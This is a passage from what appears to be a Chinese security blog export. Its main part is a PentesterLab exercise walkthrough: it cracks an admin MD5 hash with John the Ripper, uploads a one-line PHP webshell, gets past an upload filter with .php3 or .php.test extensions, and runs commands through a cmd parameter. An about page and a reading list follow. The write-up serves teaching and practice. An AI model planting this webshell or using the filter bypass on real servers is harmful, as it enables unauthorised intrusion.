1$ ./john password --format=raw-md5 --wordlist=dico --rules 使用以下选项： password 告诉John什么文件包含密码的哈希值 –format=raw-md5 告诉John密码哈希是raw-md5格式 –wordlist=dico 告诉John使用文件 dico 作为字典 –rules 告诉John尝试遍历每个可用的单词 John输出匹配的哈希数： 1Loaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)]) 这提供了一个提示，正确的格式。 你可以很快的获取到密码： 123$ ./john password --format=raw-md5 --wordlist=dico --rulesLoaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)])P4ssw0rd (admin) 上传WebShell并且执行代码一旦进入了管理页面，下一个目标是找到在操作系统上执行命令的方法。 我们可以看到，有一个文件上传功能允许用户上传图片，我们可以利用这个功能来上传一个PHP脚本。这个PHP脚本一旦上传到服务器会给我们提供一种方式，运行PHP代码和命令。 首先我们需要创建一个PHP脚本运行命令。下面是一个简单的和最小的网页木马的源代码： 123&lt;?php system($_GET['cmd']);?&gt; 这个脚本的内容为执行调用系统命令cmd。它需要被保存为一个带.php扩展名的文件。例如 shell.php 可以作为文件名。 我们现在可以使用页面 http://vulnerable/admin/new.php 提供的上传功能来尝试上传这个脚本。 我们可以看到，脚本没有正确上传到服务器上。应用阻止.php扩展名扩展名的文件上传。但是我们可以尝试： .php3 会绕过对 .php 的简单过滤 .php.test 会绕过对 .php 的简单过滤,并且Apache仍然会使用 .php 来解析，因为配置中不存在对 .test 的处理。 现在，我们需要找到这个PHP脚本，管理上传到Web服务器的文件。我们需要确保文件直接用于Web客户端。我们可以访问新上传的图像的页面，看到 &lt;img 标记指向： 12345678&lt;div class=\"content\"&gt; &lt;h2 class=\"title\"&gt;Last picture: Test shell&lt;/h2&gt; &lt;div class=\"inner\" align=\"center\"&gt; &lt;p&gt; &lt;img src=\"admin/uploads/shell.php3\" alt=\"Test shell\" /&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; 你现在可以访问下面的地址并且开始运行命令通过使用cmd参数。例如，访问 http://vulnerable/admin/uploads/shell.php3?cmd=uname 会在操作系统上运行命令 uname 并且返回当前内核( Linux )。其他命令可以用来获取更多信息: uname -a 来获得当前内核的版本； ls 来获取当前目录的内容； … 这个webshell拥有运行PHP脚本的Web服务器相同的权限，例如你不能访问文件 /etc/shadow因为web服务器不能访问这个文件（当你应该尝试假设管理员错误的改变了这个文件的权限）。 每个命令都是运行在一个全新的上下文，独立于前面的命令， 你不能通过运行 cd 和 ls来获取 /etc/ 目录中的内容，因为第二条命令是一个新的上下文。想要获得 /etc/ 目录中的内容，你需要运行 ls /etc/ 。 总结这个练习将教你如何手动检测和利用SQL注入进入管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。 这个练习基于几年前对网站进行渗透测试的结果，但存在这类漏洞的网站今天仍可以在互联网上找到。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"about","slug":"about","date":"2015-01-01T08:25:01.000Z","updated":"2023-12-30T12:52:22.048Z","comments":true,"path":"2015/01/01/about/","link":"","permalink":"https://darkwing.moe/2015/01/01/about/","excerpt":"","text":"HackTheBox TryHackMe 個人情報 27歳 男性 Discord: @darkwing_nya OSCP OSWE OSED CRTO OSEP OSCE3 Linkdedin 資格OSCP OSWE OSED CRTO OSEP OSCE3 Referral Link https://affiliate.hackthebox.com/cvbaqlygjol0 https://tryhackme.com/signup?referrer=5f1e6b65b7854a165b5d5c45","categories":[],"tags":[]},{"title":"书单","slug":"书单","date":"2015-01-01T01:53:52.000Z","updated":"2021-02-04T08:43:09.229Z","comments":true,"path":"2015/01/01/书单/","link":"","permalink":"https://darkwing.moe/2015/01/01/%E4%B9%A6%E5%8D%95/","excerpt":"","text":"HackTheBox Hack The Box 学习资料基础知识Hypertext Transfer ProtocolDomain Name SystemWhoisNetwork socketTCP/IPSecure Sockets LayerLearn about virtual hostingHow to setup vhosts with ApacheDNS zone transferSQL injectionFile inclusion vulnerabilityMIMEAntisec MovementDHCPFTPRequest for CommentsiptablesInternet Control Message ProtocolCryptographyCryptographic hash functionC (programming language)NmapSetuidWi-FiWEPWPAEnvironment VariablesNetwork Time ProtocolSMBMemory managementCall stackBuffer overflow protection 书单底层原理 《程序是怎样跑起来的》 矢泽久雄 《计算机是怎样跑起来的》 矢泽久雄 《深入理解计算机系统》 Bryant,R.E 《汇编语言》 王爽 《琢石成器—Windows 环境下32位汇编程序设计》 罗云彬 《C++反汇编与逆向分析技术揭秘》 钱林松，赵海旭 web安全 《白帽子讲web安全》 吴翰清 《图解HTTP》 上野宣 《Web前端黑客技术揭秘》 钟晨鸣 《XSS跨站脚本攻击剖析与防御》 邱永华 《SQL注入攻击与防御（第2版）》 Christof Paar、Jan Pelzl 《代码审计：企业级Web代码安全架构》 尹毅 Android安全 《第一行代码——Android》 郭霖 《Android软件安全与逆向分析》 韦生强 《Android恶意代码分析与渗透测试》 赵涏元 《Android安全架构深究》 Nikolay Elenkov 网络相关 《图解网络硬件》 三轮贤一 《图解TCP/IP》 竹下隆史，村山公保，荒井透，苅田幸雄 《Wireshark数据包分析实战》 Chris Sanders 《Wireshark网络分析就这么简单》 林沛满 《Wireshark网络分析的艺术》 林沛满 练习平台 BUUCTF HackTheBox 友链 知守实验室 懒，谁想加提comment","categories":[],"tags":[]}]}